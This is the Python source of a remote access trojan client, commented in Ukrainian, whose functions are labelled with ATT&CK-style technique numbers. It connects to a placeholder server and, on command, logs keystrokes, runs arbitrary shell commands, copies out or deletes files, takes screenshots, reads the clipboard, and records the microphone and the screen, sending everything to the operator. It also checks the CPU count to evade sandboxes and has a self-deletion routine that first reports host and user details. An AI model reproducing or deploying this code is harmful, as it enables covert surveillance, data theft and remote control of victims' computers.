# -*- coding: utf-8 -*-
# Клієнт
import sys

from pynput import keyboard
import numpy as np
import subprocess
import pyperclip
import pyautogui
import platform
import pyaudio
import socket
import wave
import time
import cv2
import os

# 1056 - Input Capture
def int_capt():

    n_keys_to_capture = int(client_socket.recv(1024).decode('utf-8'))

    pressed_keys = []

    def on_press(key):
        try:
            pressed_keys.append(key.char)

        except AttributeError:
            pressed_keys.append(str(key))

        if len(pressed_keys) >= n_keys_to_capture:
            listener.stop()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    with open('pressed_keys.txt', 'w') as file:
        file.write('\n'.join(pressed_keys))

    with open('pressed_keys.txt', 'rb') as file:
        file_size = len(file.read())
        client_socket.send(str(file_size).encode('utf-8'))

        file.seek(0)
        data = file.read(1024)
        while data:
            client_socket.sendall(data)
            data = file.read(1024)

    os.remove('pressed_keys.txt')

    print(f"Файл pressed_keys.txt відправлено на сервер")

# 1057 - Process Discovery
def proc_disc():
    if platform.system() == 'Windows':
        instr = 'tasklist'
    else:
        instr = 'ps'

    file_path = '1.txt'

    proc = subprocess.getoutput(instr)

    with open(file_path, 'w') as file:
        # Запис результату у файл
        file.write(proc)

    with open(file_path, 'rb') as file:
        file_size = len(file.read())
        client_socket.send(str(file_size).encode('utf-8'))

        file.seek(0)  # Повертаємо покажчик файлу на початок
        data = file.read(1024)
        while data:
            client_socket.sendall(data)
            data = file.read(1024)

    print(f"Файл processes.txt відправлено на сервер")

    os.remove(file_path)

# 1059 - Command-Line Interface
def cline_int():
    instr = client_socket.recv(1024).decode()
    res = subprocess.getoutput(instr)

    file_path = 'result'

    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(res)

    with open(file_path, 'rb') as file:
        file_size = len(file.read())
        client_socket.send(str(file_size).encode('utf-8'))

        file.seek(0)  # Повертаємо покажчик файлу на початок
        data = file.read(1024)
        while data:
            client_socket.sendall(data)
            data = file.read(1024)

    print(f"Файл cmd_res.txt відправлено на сервер")

    os.remove(file_path)

# 1082 - System Information Discovery
def sinf_disc():
    res = str(platform.uname()).encode()
    client_socket.send(res)

# 1083 - File and Directory Discovery
def fd_disc():
    while True:
        instruction = client_socket.recv(1024).decode()

        if instruction == 'show':
            if platform.system() == 'Windows':
                instr = 'dir'
            else:
                instr = 'ls -l'

            res = subprocess.getoutput(instr)

        elif instruction == 'exit':
            break

        else:
            if platform.system() == 'Windows':
                instr = 'dir'
            else:
                instr = 'ls -l'

            path = instruction

            res = subprocess.getoutput(instr + ' ' + path)

        file_path = 'result'

        with open(file_path, 'w', encoding='utf-8') as file:
            file.write(res)

        with open(file_path, 'rb') as file:
            file_size = len(file.read())
            client_socket.send(str(file_size).encode('utf-8'))

            file.seek(0)  # Повертаємо покажчик файлу на початок
            data = file.read(1024)
            while data:
                client_socket.sendall(data)
                data = file.read(1024)

        print(f"Файл відправлено на сервер")

        os.remove(file_path)

# 1105 - Remote File Copy
def remf_copy():
    path = client_socket.recv(1024).decode()

    with open(path, 'rb') as file:
        file_size = len(file.read())
        client_socket.send(str(file_size).encode('utf-8'))

        file.seek(0)  # Повертаємо покажчик файлу на початок
        data = file.read(1024)
        while data:
            client_socket.sendall(data)
            data = file.read(1024)

    print(f"Файл {path} відправлено на сервер")

# 1107 - File Deletion
def f_del():
    path = client_socket.recv(1024).decode()
    os.remove(path)
    print('Succesfully deleted')

# 1113 - Screen Capture
def src_capt():
    screenshot = pyautogui.screenshot()
    file_path = 'screenshot.png'
    screenshot.save(file_path)

    with open(file_path, 'rb') as file:
        file_size = len(file.read())
        client_socket.send(str(file_size).encode('utf-8'))

        file.seek(0)  # Повертаємо покажчик файлу на початок
        data = file.read(1024)
        while data:
            client_socket.sendall(data)
            data = file.read(1024)

    print(f"Файл {file_path} відправлено на сервер")

    os.remove(file_path)

# 1115 - Clipboard Data
def cl_data():
    res = pyperclip.paste().encode()
    client_socket.send(res)

# 1123 - Audio Capture
def aud_capt(channels=1, sample_rate=44100):
    p = pyaudio.PyAudio()

    filename = "audio_record.wav"

    duration = int(client_socket.recv(1024).decode())

    # Встановлення параметрів запису
    format = pyaudio.paInt16
    frames_per_buffer = 1024

    stream = p.open(format=format,
                    channels=channels,
                    rate=sample_rate,
                    input=True,
                    frames_per_buffer=frames_per_buffer)

    print("Recording...")

    frames = []

    # Записуємо звук протягом вказаного часу
    for i in range(0, int(sample_rate / frames_per_buffer * duration)):
        data = stream.read(frames_per_buffer)
        frames.append(data)

    print("Finished recording.")

    # Закриваємо потік запису
    stream.stop_stream()
    stream.close()
    p.terminate()

    # Зберігаємо записаний звук у файл WAV
    wf = wave.open(filename, 'wb')
    wf.setnchannels(channels)
    wf.setsampwidth(pyaudio.PyAudio().get_sample_size(format))
    wf.setframerate(sample_rate)
    wf.writeframes(b''.join(frames))
    wf.close()

    print("Audio recording stopped. Audio saved to", filename)

    with open(filename, 'rb') as file:
        file_size = len(file.read())
        client_socket.send(str(file_size).encode('utf-8'))

        file.seek(0)  # Повертаємо покажчик файлу на початок
        data = file.read(1024)
        while data:
            client_socket.sendall(data)
            data = file.read(1024)

    print(f"Файл {filename} відправлено на сервер")

    os.remove(filename)

# 1125 - Video Capture
def vid_capt():
    # Отримуємо параметри запису від клієнта
    video_length = int(client_socket.recv(1024).decode())
    print(f"Received video length: {video_length} seconds")

    # Записуємо відео
    output_path = 'screen_record.mp4'
    screen_size = (1920, 1080)
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    out = cv2.VideoWriter(output_path, fourcc, 20.0, screen_size)

    try:
        start_time = time.time()
        while True:
            # Отримуємо знімок екрана
            screenshot = pyautogui.screenshot()

            # Перетворюємо знімок у масив NumPy
            frame = np.array(screenshot)

            # Конвертуємо зображення з BGR в RGB
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

            # Записуємо кадр у відеофайл
            out.write(frame)

            # Перевіряємо час запису
            if time.time() - start_time > video_length:
                break

    except KeyboardInterrupt:
        pass
    finally:
        # Закриваємо відеофайл і сокет
        out.release()
        print("Screen recording stopped. Video saved to", output_path)

    with open(output_path, 'rb') as file:
        file_size = len(file.read())
        client_socket.send(str(file_size).encode('utf-8'))

        file.seek(0)  # Повертаємо покажчик файлу на початок
        data = file.read(1024)
        while data:
            client_socket.sendall(data)
            data = file.read(1024)

    print(f"Файл {output_path} відправлено на сервер")

    os.remove(output_path)

def virtualization_check():
    cpu_count = os.cpu_count()

    if cpu_count >= 8:
        pass
    else:
        exit()

def sinkhole():
    system_name = platform.system()
    system_version = platform.version()
    machine_type = platform.machine()
    processor_type = platform.processor()
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    current_user = os.getlogin()

    info = (f"System: {system_name}\n"
        f"Version: {system_version}\n"
        f"Machine Type: {machine_type}\n"
        f"Processor Type: {processor_type}\n"
        f"Hostname: {hostname}\n"
        f"IP Address: {ip_address}\n"
        f"Current User: {current_user}\n")

    client_socket.sendall(info.encode())
    os.remove("client.exe")
    sys.exit()

virtualization_check()

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('your_server_ip', 8080)  # Вкажіть реальний IP-адрес сервера

client_socket.connect(server_address)

while True:
    instruction = client_socket.recv(1024).decode()

    if instruction == '1056':
        int_capt()
    if instruction == '1057':
        proc_disc()
    if instruction == '1059':
        cline_int()
    if instruction == '1082':
        sinf_disc()
    if instruction == '1083':
        fd_disc()
    if instruction == '1105':
        remf_copy()
    if instruction == '1107':
        f_del()
    if instruction == '1113':
        src_capt()
    if instruction == '1115':
        cl_data()
    if instruction == '1123':
        aud_capt()
    if instruction == '1125':
        vid_capt()
    if instruction == '0':
        sinkhole()
    if instruction == 'exit':
        break

client_socket.close()

